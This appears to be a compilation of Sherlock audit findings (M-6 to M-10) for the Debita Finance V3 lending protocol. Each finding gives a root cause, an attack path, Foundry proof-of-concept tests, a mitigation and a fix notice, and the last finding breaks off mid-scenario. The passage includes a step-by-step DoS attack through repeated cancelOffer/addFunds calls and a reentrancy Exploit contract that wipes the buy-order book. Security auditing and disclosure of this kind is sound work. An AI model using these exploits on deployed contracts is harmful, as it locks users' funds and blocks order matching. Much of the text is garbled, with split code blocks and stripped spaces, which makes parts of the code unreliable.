# M-10 - Precision loss leads to locked-in incentives in DebitaIncentives::claimIncentives()

**Severity:** medium
**Auditor:** Sherlock
**Protocol:** Debita Finance V3
**Keywords:** DebitaIncentives, claimIncentives, precision loss, locked funds, incentives, lender, borrower, epoch, percentage, rounding, unclaimed incentives, withdraw, contract, protocol, user, interaction, token pair, incentivizers, share, loss

---

# Issue M-6: Attacker will prevent lenders from canceling lend orders and block non-perpetual lend orders matching.

Source: [https://github.com/sherlock-audit/2024-10-debita-judging/issues/246](https://github.com/sherlock-audit/2024-10-debita-judging/issues/246)

Found by
0x37, 0xPhantom2, 0xloscar01, 0xlrivo, Ace-30, Audinarey, BengalCatBalu, ExtraCaterpillar, Feder, Honour, KlosMitSoss, Moksha, Vasquez, ahmedovv, almantare, aman, araj, arman, bbl4de, befree3x, dany.armstrong90, dimah7, dimulski, eeshenggoh, farismaulana, jjk, jsmi, liquidbuddha, momentum, nikhil840096, onthehunt, pepocpeter, prosper, s0x0mtee, stakog, t.aksoy, tjonair, tourist, utsav, ydlee

Summary
The missing active order check in DLOImplementation::addFunds will allow an attacker to halt the cancellation of lend orders for every lender and prevent non-perpetual lend orders from being fully matched as the attacker will execute the following attack path:
1. Call DLOFactory::createLendOrder to create a lend order
2. Call DLOImplementation::cancelOffer. DLOFactory::deleteOrder is called inside cancelOffer and decreases the DLOFactory::activeOrdersCount by 1.
3. Call DLOImplementation::addFunds to add funds to the lend order and pass the require statement in DLOImplementation::cancelOffer
4. Repeat steps 2 and 3 until DLOFactory::activeOrdersCount is 0

When activeOrdersCount is 0, further calls to the DLOFactory::deleteOrder function will revert due to arithmetic underflow. Consequently, functions calling deleteOrder will revert as well:
- cancelOffer -> deleteOrder
- DebitaV3Aggregator::matchOffersV3 -> acceptLendingOffer -> (if (lendInformation.availableAmount == 0 && !m_lendInformation.perpetual)) deleteOrder

Root Cause
There is a missing check in DLOImplementation::addFunds function that allows adding funds to an inactive offer.
\u0060\u0060\u0060solidity
function addFunds(uint amount) public nonReentrant {
    require(
       msg.sender == lendInformation.owner ||
         IAggregator(aggregatorContract).isSenderALoan(msg.sender),
       "Only owner or loan"
    );
    SafeERC20.safeTransferFrom(
       IERC20(lendInformation.principle),
       msg.sender,
       address(this),
       amount
    );
    lendInformation.availableAmount += amount;
    IDLOFactory(factoryContract).emitUpdate(address(this));
}
\u0060\u0060\u0060

This allows an attacker to add funds to a lend order that has been canceled and pass the require statement in \u0060DLOImplementation::cancelOffer\u0060. The attacker can then call \u0060cancelOffer\u0060 to decrease the \u0060DLOFactory::activeOrdersCount\u0060 value by 1.

\u0060\u0060\u0060solidity
function cancelOffer() public onlyOwner nonReentrant {
   uint availableAmount = lendInformation.availableAmount;
   lendInformation.perpetual = false;
   lendInformation.availableAmount = 0;
   require(availableAmount > 0, "No funds to cancel");
   isActive = false;
   SafeERC20.safeTransfer(
     IERC20(lendInformation.principle),
     msg.sender,
     availableAmount
   );
   IDLOFactory(factoryContract).emitDelete(address(this));
   IDLOFactory(factoryContract).deleteOrder(address(this));
   // emit canceled event on factory
}
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
function deleteOrder(address _lendOrder) external onlyLendOrder {
   uint index = LendOrderIndex[_lendOrder];
   LendOrderIndex[_lendOrder] = 0;
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
// switch index of the last borrow order to the deleted borrow order
allActiveLendOrders[index] = allActiveLendOrders[activeOrdersCount - 1];
LendOrderIndex[allActiveLendOrders[activeOrdersCount - 1]] = index;
// take out last borrow order
allActiveLendOrders[activeOrdersCount - 1] = address(0);
activeOrdersCount--;
\u0060\u0060\u0060
## For Denial of Service in DLO Implementation::cancelOffer:
1. There needs to be at least an active lend order created by a legitimate user.

### For DebitaV3Aggregator::matchOffersV3 to revert due to the attack path execution:
1. A legitimate user must create at least an active non-perpetual lend order with _startedLendingAmount greater than 0.
2. A borrow order that matches the non-perpetual lend order must exist.
3. DebitaV3Aggregator must not be paused.
4. The borrow order must borrow the full available amount of the matched lend order. This means that when the lend order is matched by calling matchOffersV3, DLOImplementation::acceptLendingOffer is called by DebitaV3Aggregator with amount equal to lendInformation.availableAmount.

No response

### Actors:
- Attacker: Exploits the addFunds logic to reduce DLOFactory::activeOrdersCount to 0.
- Lender: creates a lend order
- Borrower: creates a borrow order
- AggregatorUser: calls DebitaV3Aggregator::matchOffersV3

### Initial State:
Assume there is a non-perpetual lend order, created by the Lender and a borrow order created by the Borrower, both are active and can be matched. The borrow order will borrow the total of the lend order availableAmount. Under this condition, \u0060DLOFactory::activeOrdersCount = 1\u0060.
## Attack Path:
1. The attacker calls \u0060DLOFactory::createLendOrder\u0060 to create a lend order. This function will increase the \u0060DLOFactory::activeOrdersCount\u0060 by 1.  
   \u0060DLOFactory::activeOrdersCount = 2\u0060
   
2. The attacker calls \u0060DLOImplementation::cancelOffer\u0060 to cancel his lend order. This function calls \u0060DLOFactory::deleteOrder\u0060 which will decrease the \u0060DLOFactory::activeOrdersCount\u0060 by 1.  
   \u0060DLOFactory::activeOrdersCount = 1\u0060
   
3. The attacker calls \u0060DLOImplementation::addFunds\u0060 with 1 as the amount parameter. This function will add 1 to the lend order\u0027s availableAmount and allow the attacker to pass the require statement in \u0060DLOImplementation::cancelOffer\u0060.

4. The attacker calls \u0060DLOImplementation::cancelOffer\u0060 to decrease the activeOrdersCount by 1.  
   \u0060DLOFactory::activeOrdersCount = 0\u0060
   
5. The Aggregator User calls \u0060DebitaV3Aggregator::matchOffersV3\u0060 to match the non-perpetual lend order with the borrow order. This function calls \u0060DLOImplementation::acceptLendingOffer\u0060 with amount equal to \u0060lendInformation.availableAmount\u0060. As the lend order availableAmount is now 0, the if statement in \u0060DLOImplementation::acceptLendingOffer\u0060 is true:  
   \u0060lendInformation.availableAmount == 0 && !m_lendInformation.perpetual\u0060  
   and \u0060DLOFactory::deleteOrder\u0060 is called inside \u0060acceptLendingOffer\u0060. \u0060deleteOrder\u0060 will try to decrease the \u0060DLOFactory::activeOrdersCount\u0060 value by 1, but as its value is 0, the function will revert due to arithmetic underflow.

6. The Lender calls \u0060DLOImplementation::cancelOffer\u0060 to cancel his lend order. \u0060DLOFactory::deleteOrder\u0060 is called inside \u0060cancelOffer\u0060 and will revert due to the \u0060activeOrdersCount\u0060 being 0.

- Lenders cannot cancel their lend orders to withdraw their funds.
- Non-perpetual lend orders cannot be 100% accepted.
- A lender who wishes to cancel their lend order will be forced to create a new lend order with the sole purpose of increasing the \u0060DLOFactory::activeOrdersCount\u0060 value and allowing the lender to cancel their initial lend order. This requires that the attacker cease the attack.

\u0060\u0060\u0060solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {stdError} from "forge-std/StdError.sol";
import {DLOImplementation} from "@contracts/DebitaLendOffer-Implementation.sol";
import {DLOFactory} from "@contracts/DebitaLendOfferFactory.sol";
import {DBOImplementation} from "@contracts/DebitaBorrowOffer-Implementation.sol";
import {DBOFactory} from "@contracts/DebitaBorrowOffer-Factory.sol";
import {DebitaV3Aggregator} from "@contracts/DebitaV3Aggregator.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {DebitaIncentives} from "@contracts/DebitaIncentives.sol";
import {Ownerships} from "@contracts/DebitaLoanOwnerships.sol";
import {auctionFactoryDebita} from "@contracts/auctions/AuctionFactory.sol";
import {DebitaV3Loan} from "@contracts/DebitaV3Loan.sol";
import {DynamicData} from "../../interfaces/getDynamicData.sol";

contract DOSTest is Test {
    DBOFactory public DBOFactoryContract;
    DLOFactory public DLOFactoryContract;
    Ownerships public ownershipsContract;
    DebitaIncentives public incentivesContract;
    DebitaV3Aggregator public DebitaV3AggregatorContract;
    auctionFactoryDebita public auctionFactoryDebitaContract;
    DebitaV3Loan public DebitaV3LoanContract;
    ERC20Mock public AEROContract;
    ERC20Mock public USDCContract;
    ERC20Mock public wETHContract;
    DLOImplementation public LendOrder;
    DBOImplementation public BorrowOrder;
    DynamicData public allDynamicData;
    address USDC;
    address wETH;
    address borrower = address(0x02);
    address lender1 = address(0x03);
    address lender2 = address(0x04);
    address lender3 = address(0x05);
    address feeAddress = address(this);

    function setUp() public {
        allDynamicData = new DynamicData();
        ownershipsContract = new Ownerships();
        incentivesContract = new DebitaIncentives();
        DBOImplementation borrowOrderImplementation = new DBOImplementation();
\u0060\u0060\u0060
DBOFactoryContract = new DBOFactory(address(borrowOrderImplementation));
DLOImplementation proxyImplementation = new DLOImplementation();
DLOFactoryContract = new DLOFactory(address(proxyImplementation));
auctionFactoryDebitaContract = new auctionFactoryDebita();
USDCContract = new ERC20Mock();
wETHContract = new ERC20Mock();
DebitaV3Loan loanInstance = new DebitaV3Loan();
DebitaV3AggregatorContract = new DebitaV3Aggregator(
  address(DLOFactoryContract),
  address(DBOFactoryContract),
  address(incentivesContract),
  address(ownershipsContract),
  address(auctionFactoryDebitaContract),
  address(loanInstance)
);
USDC = address(USDCContract);
wETH = address(wETHContract);
wETHContract.mint(address(this), 15 ether);
wETHContract.mint(lender1, 5 ether);
wETHContract.mint(lender2, 5 ether);
wETHContract.mint(lender3, 5 ether);
ownershipsContract.setDebitaContract(
  address(DebitaV3AggregatorContract)
);
incentivesContract.setAggregatorContract(
  address(DebitaV3AggregatorContract)
);
DLOFactoryContract.setAggregatorContract(
  address(DebitaV3AggregatorContract)
);
DBOFactoryContract.setAggregatorContract(
  address(DebitaV3AggregatorContract)
);
auctionFactoryDebitaContract.setAggregator(
  address(DebitaV3AggregatorContract)
);
// Attack path:
// 1. multiple lend offers are created
// 2. borrow offer is created
// 3. lender1 executes cancelOffer -> addFunds multiple times until
// DLOFactory::activeOrdersCount == 0
// 4. user calls matchOffersV3 and another lender calls cancelOffer. Both
// should fail

function testDOSAttack() public {
    bool[] memory oraclesActivated = allDynamicData.getDynamicBoolArray(1);
    uint[] memory ltvs = allDynamicData.getDynamicUintArray(1);
    uint[] memory ratio = allDynamicData.getDynamicUintArray(1);
    uint[] memory ratioLenders = allDynamicData.getDynamicUintArray(1);
    uint[] memory ltvsLenders = allDynamicData.getDynamicUintArray(1);
    bool[] memory oraclesActivatedLenders = allDynamicData.getDynamicBoolArray(1);
    address[] memory acceptedPrinciples = allDynamicData.getDynamicAddressArray(1);
    address[] memory acceptedCollaterals = allDynamicData.getDynamicAddressArray(1);
    address[] memory oraclesCollateral = allDynamicData.getDynamicAddressArray(1);
    address[] memory oraclesPrinciples = allDynamicData.getDynamicAddressArray(1);
    ratioLenders[0] = 1e18;
    ratio[0] = 1e18;
    acceptedPrinciples[0] = wETH;
    acceptedCollaterals[0] = USDC;
    oraclesActivated[0] = false;
    // Create multiple lend offers
    vm.startPrank(lender1);
    wETHContract.approve(address(DLOFactoryContract), 5 ether);
    address lendOffer1 = DLOFactoryContract.createLendOrder({
        _perpetual: false,
        _oraclesActivated: oraclesActivatedLenders,
        _lonelyLender: false,
        _LTVs: ltvsLenders,
        _apr: 1000,
        _maxDuration: 8640000,
        _minDuration: 86400,
        _acceptedCollaterals: acceptedCollaterals,
        _principle: wETH,
        _oracles_Collateral: oraclesCollateral,
        _ratio: ratioLenders,
        _oracleID_Principle: address(0x0),
        _startedLendingAmount: 5e18
    });
    vm.startPrank(lender2);
    wETHContract.approve(address(DLOFactoryContract), 5 ether);
}
address lendOffer2 = DLOFactoryContract.createLendOrder({
    _perpetual: false,
    _oraclesActivated: oraclesActivatedLenders,
    _lonelyLender: false,
    _LTVs: ltvsLenders,
    _apr: 1000,
    _maxDuration: 8640000,
    _minDuration: 86400,
    _acceptedCollaterals: acceptedCollaterals,
    _principle: wETH,
    _oracles_Collateral: oraclesCollateral,
    _ratio: ratioLenders,
    _oracleID_Principle: address(0x0),
    _startedLendingAmount: 5e18
});
vm.startPrank(lender3);
wETHContract.approve(address(DLOFactoryContract), 5 ether);
address lendOffer3 = DLOFactoryContract.createLendOrder({
    _perpetual: false,
    _oraclesActivated: oraclesActivatedLenders,
    _lonelyLender: false,
    _LTVs: ltvsLenders,
    _apr: 1000,
    _maxDuration: 8640000,
    _minDuration: 86400,
    _acceptedCollaterals: acceptedCollaterals,
    _principle: wETH,
    _oracles_Collateral: oraclesCollateral,
    _ratio: ratioLenders,
    _oracleID_Principle: address(0x0),
    _startedLendingAmount: 5e18
});
vm.stopPrank();
// Create a borrow offer
USDCContract.mint(borrower, 10e18);
vm.startPrank(borrower);
USDCContract.approve(address(DBOFactoryContract), 100e18);
address borrowOrderAddress = DBOFactoryContract.createBorrowOrder({
    _oraclesActivated: oraclesActivated,
    _LTVs: ltvs,
    _maxInterestRate: 1400,
    _duration: 864000,
    _acceptedPrinciples: acceptedPrinciples,
    _collateral: USDC,
_isNFT: false,
_receiptID: 0,
_oracleIDS_Principles: oraclesPrinciples,
_ratio: ratio,
_oracleID_Collateral: address(0x0),
_collateralAmount: 10e18
});
vm.stopPrank();
// Lender1 begins the attack
// check DLOFactory::activeOrdersCount == 3
assertEq(DLOFactoryContract.activeOrdersCount(), 3);
// lender1 cancels the offer -> DLOFactory::activeOrdersCount == 2
vm.startPrank(lender1);
DLOImplementation(lendOffer1).cancelOffer();
// addFunds (1 wei)
wETHContract.approve(lendOffer1, 3);
DLOImplementation(lendOffer1).addFunds(1);
// cancelOffer again -> DLOFactory::activeOrdersCount == 1
DLOImplementation(lendOffer1).cancelOffer();
// addFunds (1 wei)
DLOImplementation(lendOffer1).addFunds(1);
// lender1 cancels the offer -> DLOFactory::activeOrdersCount == 0
DLOImplementation(lendOffer1).cancelOffer();
vm.stopPrank();
// check DLOFactory::activeOrdersCount == 0
assertEq(DLOFactoryContract.activeOrdersCount(), 0);
// now try to call mathOffersV3 -> should fail
address[] memory lendOrders = new address[](1);
uint[] memory lendAmounts = allDynamicData.getDynamicUintArray(1);
uint[] memory percentagesOfRatio = allDynamicData.getDynamicUintArray(
1
);
uint[] memory indexForPrinciple_BorrowOrder = allDynamicData
.getDynamicUintArray(1);
uint[] memory indexForCollateral_LendOrder = allDynamicData
.getDynamicUintArray(1);
uint[] memory indexPrinciple_LendOrder = allDynamicData
.getDynamicUintArray(1);
lendOrders[0] = lendOffer3;
\u0060\u0060\u0060solidity
percentagesOfRatio[0] = 10000;
lendAmounts[0] = 5e18;
vm.expectRevert(stdError.arithmeticError);
address deployedLoan = DebitaV3AggregatorContract.matchOffersV3({
    lendOrders: lendOrders,
    lendAmountPerOrder: lendAmounts,
    porcentageOfRatioPerLendOrder: percentagesOfRatio,
    borrowOrder: borrowOrderAddress,
    principles: acceptedPrinciples,
    indexForPrinciple_BorrowOrder: indexForPrinciple_BorrowOrder,
    indexForCollateral_LendOrder: indexForCollateral_LendOrder,
    indexPrinciple_LendOrder: indexPrinciple_LendOrder
});
// lender2 tries to cancel his lend order -> should fail
vm.startPrank(lender2);
vm.expectRevert(stdError.arithmeticError);
DLOImplementation(lendOffer2).cancelOffer();
\u0060\u0060\u0060

Step to reproduce:
1. Create a file DOSTest.t.sol inside Debita-V3-Contracts/test/local/Loan/ and paste the PoC code.
2. Run the test in the terminal with the following command:
   \u0060\u0060\u0060
   forge test --mt testDOSAttack
   \u0060\u0060\u0060

Mitigation
Add a check in DLOImplementation::cancelOffer to prevent cancelling an inactive lend order.

\u0060\u0060\u0060solidity
contract DLOImplementation is ReentrancyGuard, Initializable {
    ...
    // function to cancel the lending offer
    // only callable once by the owner
    // in case of perpetual, the funds won\u0027t come back here and lender will need
    // to claim it from the lend orders
    function cancelOffer() public onlyOwner nonReentrant {
        require(isActive, "Offer is not active");
        uint availableAmount = lendInformation.availableAmount;
        lendInformation.perpetual = false;
        lendInformation.availableAmount = 0;
        require(availableAmount > 0, "No funds to cancel");
    }
}
\u0060\u0060\u0060
isActive = false;
AddacheckinDLOImplementation::addFundstopreventaddingfundstoaninactive offer, this will prevent lenders from getting their funds stuck in an inactive order.

contract DLOImplementation is ReentrancyGuard, Initializable {
   function addFunds(uint amount) public nonReentrant {
      require(
         msg.sender == lendInformation.owner ||
           IAggregator(aggregatorContract).isSenderALoan(msg.sender),
         "Only owner or loan"
      );
      require(isActive, "Offer is not active");
      SafeERC20.safeTransferFrom(
         IERC20(lendInformation.principle),
         msg.sender,
         address(this),
         amount
      );
}

sherlock-admin2
The protocol team fixed this issue in the following PRs/commits:
https://github.com/DebitaFinance/Debita-V3-Contracts/commit/206c6ede06ab1d84943bd0b8431d6c0a9c9faaa7
## Issue M-7: An attacker can wipe the order book in buyOrderFactory.sol

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-10-debita-judging/issues/326)  
Found by: 0x37, Adam Szymanski, VAD37, Vidus, copperscrewer, liquidbuddha, tourist

A malicious actor can wipe the complete buy order order book in buyOrderFactory.sol. The attack—excluding gas costs—does not bear any financial burden on the attacker. As a result of the exploit, the order book will be temporarily inaccessible in the factory, leading to a DoS state in buy order matching, and in closing and selling existing positions.

The function \u0060sellNFT(uint receiptID)\u0060 lacks reentrancy protection:  
[Link to Code](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/buyOrders/buyOrder.sol#L92)

N/A

N/A

1. Attacker calls \u0060createBuyOrder(address _token, address wantedToken, uint _amount, uint ratio)\u0060 with exploit contract supplied in parameter \u0060wantedToken\u0060
2. Attacker calls \u0060sellNFT(uint receiptID)\u0060 which triggers the exploit sequence
3. Exploit contract will reenter \u0060sellNFT\u0060 multiple times, triggering a cascade of buy order deletions

The order book in \u0060buyOrderFactory.sol\u0060 will be inaccessible. The function \u0060getActiveBuyOrders(uint offset, uint limit)\u0060 is used by off-chain services to gather buy order data—this data will be temporarily blocked. Deleting existing buy orders (\u0060deleteBuyOrder()\u0060) and selling NFTs (\u0060sellNFT(uint receiptID)\u0060) will also be temporarily blocked until the issue is resolved manually. The issue can be resolved manually by:
- Opening dummy buy orders with very little collateral
- Closing/selling positions on existing “legit” orders


Note: the PoC is somewhat hastily developed as the audit deadline is quite short relative to the project scope. Executing the PoC with the verbose flag (for \u0060test -vvvv\u0060) will show that deletion is triggered multiple times.
## Exploit contract:
\u0060\u0060\u0060solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface BuyOrder {
    function sellNFT(uint receiptID) external;
}

contract Exploit {
    BuyOrder public buyOrder;
    uint public counter = 0;
    uint public counterMax = 2;

    struct receiptInstance {
        uint receiptID;
        uint attachedNFT;
        uint lockedAmount;
        uint lockedDate;
        uint decimals;
        address vault;
        address underlying;
    }

    constructor() {}

    function setBuyOrder(address _buyOrder) public {
        buyOrder = BuyOrder(_buyOrder);
    }

    fallback() external payable {
        if (counter < 2) {
\u0060\u0060\u0060
\u0060\u0060\u0060
counter++;
buyOrder.sellNFT(0);
}
if (counter == counterMax) {
counter++;
buyOrder.sellNFT(1);
}
}
function getDataByReceipt(uint receiptID) public view returns (receiptInstance
→ memory) {
uint lockedAmount;
if (receiptID == 1) {
lockedAmount = 1;
} else {
lockedAmount = 0;
}
uint lockedDate = 0;
uint decimals = 0;
address vault = address(this);
address underlying = address(this);
bool OwnerIsManager = true;
return receiptInstance(receiptID, 0, lockedAmount, lockedDate, decimals,
→ vault, underlying);
}
}
Forgetest:
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import "forge-std/StdCheats.sol";
import {BuyOrder, buyOrderFactory} from "@contracts/buyOrders/buyOrderFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import {Exploit} from "./exploit.sol";
contract BuyOrderTest is Test {
buyOrderFactory public factory;
BuyOrder public buyOrder;
BuyOrder public buyOrderContract;
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
ERC20Mock public AERO;
Exploit public exploit;

function setUp() public {
    BuyOrder instanceDeployment = new BuyOrder();
    factory = new buyOrderFactory(address(instanceDeployment));
    AERO = new ERC20Mock();
}

function testMultipleDeleteBuyOrder() public {
    address alice = makeAddr("alice");
    deal(address(AERO), alice, 1000e18, false);
    vm.startPrank(alice);
    IERC20(AERO).approve(address(factory), 1000e18);
    exploit = new Exploit();
    factory.createBuyOrder(address(AERO), address(AERO), 1, 1);
    factory.createBuyOrder(address(AERO), address(AERO), 1, 1);
    factory.createBuyOrder(address(AERO), address(AERO), 1, 1);
    address _buyOrderAddress = factory.createBuyOrder(
        address(AERO),
        address(exploit),
        1,
        1
    );
    exploit.setBuyOrder(_buyOrderAddress);
    buyOrderContract = BuyOrder(_buyOrderAddress);
    buyOrderContract.sellNFT(2);
    vm.stopPrank();
}
\u0060\u0060\u0060

Mitigation
Apply reentrancy protection on the function \u0060sellNFT(uint receiptID)\u0060:
[Link to Code](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/buyOrders/buyOrder.sol#L92)

sherlock-admin2  
The protocol team fixed this issue in the following PRs/commits:  
https://github.com/DebitaFinance/Debita-V3-Contracts/commit/f3195e007b0c22dc01  
73a344157c182726dbf2ec  
46
## Issue M-8: Lender may lose part of the interest he has accrued if he makes his lend offer perpetual after a loan has been extended by the borrower

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-10-debita-judging/issues/345)  
Found by: dimulski  

The DebitaV3Loan.sol contract allows borrowers to extend their loan against certain fees by calling the \u0060extendLoan()\u0060 function:

\u0060\u0060\u0060solidity
function extendLoan() public {
    ...
    /*
    CHECK IF CURRENT LENDER IS THE OWNER OF THE OFFER & IF IT\u0027S PERPETUAL
    ֒→  FOR INTEREST
    */
    DLOImplementation lendOffer = DLOImplementation(
        offer.lendOffer
    );
    DLOImplementation.LendInfo memory lendInfo = lendOffer
        .getLendInfo();
    address currentOwnerOfOffer;
    try ownershipContract.ownerOf(offer.lenderID) returns (
        address _lenderOwner
    ) {
        currentOwnerOfOffer = _lenderOwner;
    } catch {}
    if (
        lendInfo.perpetual && lendInfo.owner == currentOwnerOfOffer
    ) {
        IERC20(offer.principle).approve(
            address(lendOffer),
            interestOfUsedTime - interestToPayToDebita
        );
        lendOffer.addFunds(
\u0060\u0060\u0060
interestOfUsedTime - interestToPayToDebita
                              );
                         } else {
                              loanData._acceptedOffers[i].interestToClaim +=
                                  interestOfUsedTime -
                                  interestToPayToDebita;
                         }
                         loanData._acceptedOffers[i].interestPaid += interestOfUsedTime;
                     }
                 }
                 Aggregator(AggregatorContract).emitLoanUpdated(address(this));
            }
           TheextendLoan()function,alsocalculatestheinterestthatisowedtothelendersupto
           thepointthefunctioniscalled. Ascanbeseenfromtheabovecodesnippetifthelend
           orderisnotperpetualtheaccruedinterestwillbeaddedtotheinterestToClaimfield.
           Nowifaloanhasbeenextendedbytheborrower,andalenderdecideshewantsto
           makehislendorderperpetual(meaningthatanygeneratedinterest,whichmaycome
           fromotherloansaswell,willbedirectlydepositedtohislendordercontract),butdoesn\u0027t
           first claim his interest he will loose the interest that has been accrued up to the point the
           loanwasextended. WhentheborrowerrepayshisloanviathepayDebt()function:
            function payDebt(uint[] memory indexes) public nonReentrant {
                     ...
                     DLOImplementation lendOffer = DLOImplementation(offer.lendOffer);
                     DLOImplementation.LendInfo memory lendInfo = lendOffer
                         .getLendInfo();
                     SafeERC20.safeTransferFrom(
                         IERC20(offer.principle),
                         msg.sender,
                         address(this),
                         total
                     );
                     // if the lender is the owner of the offer and the offer is perpetual, then
             ֒→  add the funds to the offer
                     if (lendInfo.perpetual && lendInfo.owner == currentOwnerOfOffer) {
                         loanData._acceptedOffers[index].debtClaimed = true;
                         IERC20(offer.principle).approve(address(lendOffer), total);
                         lendOffer.addFunds(total);
                     } else {
                         loanData._acceptedOffers[index].interestToClaim =
                              interest -
                              feeOnInterest;
                     }
                     SafeERC20.safeTransferFrom(
                         IERC20(offer.principle),
\u0060\u0060\u0060solidity
msg.sender,
feeAddress,
feeOnInterest
);
loanData._acceptedOffers[index].interestPaid += interest;
// update total count paid
loanData.totalCountPaid += indexes.length;
Aggregator(AggregatorContract).emitLoanUpdated(address(this));
// check owner
\u0060\u0060\u0060

As can be seen from the above code snippet if the lend order is perpetual the interest generated after the loan has been extended will be directly sent to the lend offer contract alongside with the principal of the loan, and the debtClaimed will be set to true. This prohibits the user from calling the claimDebt() function later on in order to receive the interest he accrued before the loan was extended. This results in the lender losing the interest he has generated before the loan was extended, which based on the amount of the loan, the duration and the APR may be a significant amount. Keep in mind that most users of the protocol are not experienced web3 developers or auditors and most probably won\u0027t be tracking if and when a loan has been extended. They will expect that after certain time has passed, they will be able to claim their interest, or if they have set their lend order to be a perpetual one, they will expect just to sit back, and generate interest.


The payDebt() function sets the debtClaimed to true, if a lend order is perpetual. The lender can\u0027t call the claimDebt() function in order to get this accrued interest, if he had any before the payDebt() function was called by the borrower to repay his debt.


1. Borrow and Lend Orders are matched, the Lend orders are not perpetual
2. Several days after the loan has been created pass, the borrower decides to extend the loan
3. Some of the lenders decide to make their lend orders perpetual, without first claiming the interest they have generated before the loan was extended.


No response
## Attack Path

No response


In a scenario where a borrower extends a loan, and later on a lender makes his lender a perpetual one, the lender will lose the interest he accrued before the loan was extended. Based on factors such as loan duration, APR and amount those losses may be significant. Those funds will be locked in the contract forever.


No response


Consider implementing a separate function just for claiming interest.


sherlock-admin2  
The protocol team fixed this issue in the following PRs/commits:  
[https://github.com/DebitaFinance/Debita-V3-Contracts/commit/8008bb515d7f6eafc5c98a444d985cd6f9416c37](https://github.com/DebitaFinance/Debita-V3-Contracts/commit/8008bb515d7f6eafc5c98a444d985cd6f9416c37)
## Issue M-9: Mixed Token Price Will Be Inflated or Deflated

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-10-debita-judging/issues/362)  
Found by: dimulski, jsmi

The MixOracle::getThePrice() function contains a logical error, causing the calculated price of a token to be incorrectly inflated or deflated. This issue arises when token pairs with differing decimal scales are used, leading to inaccurate pricing data.

1. The problem lies in the following function:
   [MixOracle.sol](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/oracles/MixOracle/MixOracle.sol#L40-L70)
   \u0060\u0060\u0060solidity
   function getThePrice(address tokenAddress) public returns (int) {
       // get tarotOracle address
       address _priceFeed = AttachedTarotOracle[tokenAddress];
       require(_priceFeed != address(0), "Price feed not set");
       require(!isPaused, "Contract is paused");
       ITarotOracle priceFeed = ITarotOracle(_priceFeed);
       address uniswapPair = AttachedUniswapPair[tokenAddress];
       require(isFeedAvailable[uniswapPair], "Price feed not available");
       // get twap price from token1 in token0
       (uint224 twapPrice112x112, ) = priceFeed.getResult(uniswapPair);
       address attached = AttachedPricedToken[tokenAddress];
       // Get the price from the pyth contract, no older than 20 minutes
       // get usd price of token0
       int attachedTokenPrice = IPyth(debitaPythOracle).getThePrice(attached);
       uint decimalsToken1 = ERC20(attached).decimals();
       uint decimalsToken0 = ERC20(tokenAddress).decimals();
       // calculate the amount of attached token that is needed to get 1 token1
       int amountOfAttached = int(
           (((2 ** 112)) * (10 ** decimalsToken1)) / twapPrice112x112
       );
   }
   \u0060\u0060\u0060
\u0060\u0060\u0060solidity
// calculate the price of 1 token1 in usd based on the attached token
uint price = (uint(amountOfAttached) * uint(attachedTokenPrice)) /
(10 ** decimalsToken1);
require(price > 0, "Invalid price");
return int(uint(price));
\u0060\u0060\u0060

Here, \u0060decimalsToken1\u0060 is mistakenly used for scaling instead of \u0060decimalsToken0\u0060 in line 66. This discrepancy is critical when the token pair has different decimals. Furthermore, the variable \u0060decimalsToken0\u0060 is defined but not utilized anywhere else in the function, highlighting a clear logical oversight.

The admin sets token pairs in the MixOracle where the tokens have differing decimals (e.g., USDC with 6 decimals and DAI with 18 decimals).

No response

1. Assume \u0060MixOracle::getThePrice()\u0060 is called with \u0060tokenAddress = DAI\u0060.
2. In the contract:
   - \u0060decimalsToken0 = 1e18\u0060 (DAI has 18 decimals).
   - \u0060decimalsToken1 = 1e6\u0060 (USDC has 6 decimals).
3. Due to the logical error in line 66, the token price will be inflated by \u00601e12\u0060 (or deflated in other cases), depending on the tokens in the pair.
4. This incorrect price propagation may result in:
   - Incorrect exchange rates.
   - Loss of funds for users or systems relying on this data.

MixOracle gets the inflated/deflated price, leading to the loss of funds.

No response

In line 61, replace decimalsToken1 with decimalsToken0.
\u0060\u0060\u0060solidity
uint price = (uint(amountOfAttached) * uint(attachedTokenPrice)) /
    (10 ** decimalsToken1);
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
uint price = (uint(amountOfAttached) * uint(attachedTokenPrice)) /
    (10 ** decimalsToken0);
\u0060\u0060\u0060


sherlock-admin2  
The protocol team fixed this issue in the following PRs/commits:  
[https://github.com/DebitaFinance/Debita-V3-Contracts/commit/c5573af2b866686390a82eef67817454624ed9c7](https://github.com/DebitaFinance/Debita-V3-Contracts/commit/c5573af2b866686390a82eef67817454624ed9c7)
## Issue M-10: Precision loss leads to locked-in incentives in DebitaIncentives::claimIncentives()

Source: [GitHub Issue #385](https://github.com/sherlock-audit/2024-10-debita-judging/issues/385)  
Found by: BengalCatBalu, KlosMitSoss, Maroutis, VAD37, dany.armstrong90, jsmi, pashap9990  

When a lender or borrower calls \u0060DebitaIncentives::claimIncentives()\u0060 to claim a share of the incentives for a specific token pair they interacted with during an epoch, their share is calculated as a percentage. This percentage is determined based on the amount they lent or borrowed through the protocol during that epoch, relative to the total amount lent and borrowed by all users in the same period.  
The percentage is rounded to two decimal places, which means up to 0.0099% of the incentives may remain unclaimed for each lender or borrower. Consider the following simple scenario:  
1. Six lenders each lent \u00605e18\u0060 over a 14-day period for a specific token pair  
2. That token pair is incentivized with \u00601000e18\u0060  
3. The total amount lent equals \u00606 * 5e18 = 30e18\u0060  

